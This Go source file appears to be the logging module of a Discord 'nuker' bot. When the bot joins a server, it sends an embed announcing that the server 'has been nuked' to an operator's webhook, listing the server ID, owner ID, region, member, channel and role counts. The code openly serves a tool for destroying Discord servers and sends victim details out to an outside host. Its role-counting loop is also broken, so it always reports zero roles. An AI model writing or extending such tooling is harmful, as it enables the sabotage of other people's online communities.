package cogs

import (
	"fmt"
	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
	"os"
)

func Logs(s *discordgo.Session, event *discordgo.GuildCreate) {

	godotenv.Load()
	AVATAR_URL := os.Getenv("AVATAR_URL")
	WEBHOOK_ID := os.Getenv("WEBHOOK_ID")
	WEBHOOK_TOKEN := os.Getenv("WEBHOOK_TOKEN")

	var textChannels int
	channels, _ := s.GuildChannels(event.ID)
	for _, channel := range channels {
		if channel.Type == discordgo.ChannelTypeGuildText {
			textChannels++
		}
	}

	var rolesInt int
	roles, _ := s.GuildRoles(event.ID)
	for rolesInt := range roles {
		rolesInt++
	}

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:     "Server " + fmt.Sprint(event.Name) + " has been nuked.",
		Thumbnail: &thumbnail,
		Color:     00255,
		Description: "> **Server ID:** " + "`" + fmt.Sprint(event.ID) + "`\n" +
			"> **Owner ID:** " + "`" + fmt.Sprint(event.OwnerID) + "`\n" +
			"> **Region:** " + "`" + fmt.Sprint(event.Region) + "`\n" +
			"> **Nuker:** " + "`" + fmt.Sprint("...") + "`\n" +
			"\n" +
			"> **All Members:** " + "`" + fmt.Sprint(event.MemberCount) + "`\n" +
			"> **All Channels:** " + "`" + fmt.Sprint(textChannels) + "`\n" +
			"> **All Roles:** " + "`" + fmt.Sprint(rolesInt) + "`\n" +
			"\n" +
			"> **Joined At:** " + "`" + fmt.Sprint(event.JoinedAt) + "`\n",
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}

	s.WebhookExecute(WEBHOOK_ID, WEBHOOK_TOKEN, true, data)

}
